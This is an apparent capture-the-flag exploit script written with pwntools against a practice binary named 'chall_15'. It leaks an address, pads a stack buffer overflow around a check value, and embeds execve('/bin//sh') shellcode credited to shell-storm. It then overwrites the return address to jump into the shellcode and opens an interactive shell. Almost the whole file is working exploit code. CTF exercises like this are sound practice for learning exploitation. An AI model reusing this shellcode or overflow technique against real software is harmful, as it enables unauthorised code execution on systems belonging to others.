#this challenge was a little tough for me, and i definitely used the write up a bit more than i'd like
from pwn import *
p = process ("./chall_15")
context.arch = "amd64" 
elf = ELF("./chall_15") 


p.sendline()
resp = p.recv()

import re
mainLoc = re.findall(b"([a-f0-9]{8,16})",resp)[0]
mainAddr = int(mainLoc, 16)

#this shellcode is from shell-storm 905, from the write up
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'


payload = b''
payload += (0x4e - 0x44) * b'A'
payload += p32(0xfacade)
payload += (0x10 - (mainAddr + len(payload)) & 0xf) * b'A'

mainAddr += len(payload)

payload += shellcode
payload += (0x4e - len(payload) - 0xc) * b'A'
payload += p32(0xfacade)
payload += (0x4e - len(payload)) * b'A'
payload += p64(mainAddr)

p.sendline(payload)
p.interactive()
ls